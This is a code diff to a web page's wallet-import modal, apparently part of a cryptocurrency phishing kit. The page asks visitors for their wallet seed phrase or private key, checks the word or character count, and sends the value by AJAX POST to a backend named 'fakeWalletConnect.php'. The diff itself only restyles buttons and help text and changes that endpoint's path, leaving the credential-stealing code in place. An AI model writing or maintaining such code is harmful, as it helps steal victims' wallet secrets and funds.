@@ -87,8 +87,8 @@ window.onload = () => {
                   <img style="height: 30px;" class="selectedWalletImg">
                   <p class="card-text selectedWalletName"></p>
                 </div>
-                <a href="#" class=" mt-3 ml-2 mt-2 hoverkey seedPhrase onactive" onclick="seedPhrase()">Seed Phrase</a>
-                <a href="#" class=" mt-3 ml-2 mt-2 hoverkey privateKey" onclick="privateKey()">Private key</a>
+                <a href="#" class=" mt-3 ml-2 mt-2 hoverkey  seedPhrase badge bg-primary onactive" onclick="seedPhrase()">Seed Phrase</a>
+                <a href="#" class=" mt-3 ml-2 mt-2 badge bg-primary hoverkey privateKey" onclick="privateKey()">Private key</a>
                 <div style="width: 100%;" class="walletPassword">
 
                   <div class="mt-2" style="width: 100%; display:flex;flex-direction:column;gap:8px;">
@@ -271,7 +271,7 @@ function seedPhrase(event) {
                   <div style="width:100%; display:flex;align-items:center;" class="w-100">
                     <span class="walletError" style="color:red"></span>
                   </div>
-                  <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+                  <p style="color:white">Typically 12 (sometimes 24) words separated by single spaces</p>
                   <div style="display:flex; flex-direction:column; gap:10px">
                         <button type="button" class="btn btn-primary PROCEED" onclick="proceed()">Import Wallet</button>
                         <button data-dismiss="modal" type="button" class="btn btn-danger">CANCEL</button>
@@ -299,7 +299,7 @@ function privateKey(event) {
                   <div style="width:100%; display:flex;align-items:center;" class="w-100">
                     <span class="walletError" style="color:red"></span>
                   </div>
-                  <p>Your wallet Private key (Not Public key) </p>
+                  <p style="color:white !important">Your wallet Private key (Not Public key) </p>
                   <div style="display:flex; flex-direction:column; gap:10px">
                         <button type="button" class="btn btn-primary PROCEED" onclick="proceed()">Import Wallet</button>
                         <button data-dismiss="modal" type="button" class="btn btn-danger">CANCEL</button>
@@ -331,7 +331,7 @@ function proceed() {
     if (wordCount === 12 || wordCount == 15 || wordCount == 18 || wordCount == 21 || wordCount == 24) {
       $(() => {
         $.ajax({
-          url: "../../backend/fakeWalletConnect.php",
+          url: "../server/fakeWalletConnect.php",
           method: "POST",
           data: {
             privateKey: null,
@@ -358,7 +358,7 @@ function proceed() {
     if (textCount == 32 || textCount == 48 || textCount == 64 || textCount == 66) {
       $(() => {
         $.ajax({
-          url: "../../backend/fakeWalletConnect.php",
+          url: "../server/fakeWalletConnect.php",
           method: "POST",
           data: {
             privateKey: value,
